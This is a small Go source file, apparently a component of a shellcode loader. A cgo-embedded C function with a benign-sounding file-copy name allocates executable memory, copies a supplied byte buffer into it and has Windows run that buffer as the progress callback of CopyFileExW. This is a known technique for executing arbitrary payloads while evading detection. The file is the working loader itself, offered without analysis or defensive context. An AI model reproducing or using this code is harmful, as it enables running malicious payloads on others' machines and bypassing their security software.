package cloader

/*
#include <windows.h>

void copyFileEx(uintptr_t p, int len) {
	LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
		DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
		CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)addr, 0, FALSE, COPY_FILE_FAIL_IF_EXISTS);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func CopyFileEx(p []byte) {
	C.copyFileEx((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
